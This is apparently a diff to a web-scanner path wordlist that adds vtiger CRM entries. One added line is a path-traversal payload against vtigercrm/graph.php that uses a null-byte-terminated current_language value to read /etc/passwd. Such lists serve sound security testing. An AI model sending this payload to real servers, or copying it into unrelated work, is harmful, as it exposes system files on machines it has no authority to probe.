@@ -6684,6 +6684,10 @@ _vti_cnf
 _vti_cnf/
 vtiger
 vtiger/
+vtigercrm
+vtigercrm/
+vtigercrm/graph.php
+vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action
 _vti_inf.html
 _vti_info.html
 _vti_log
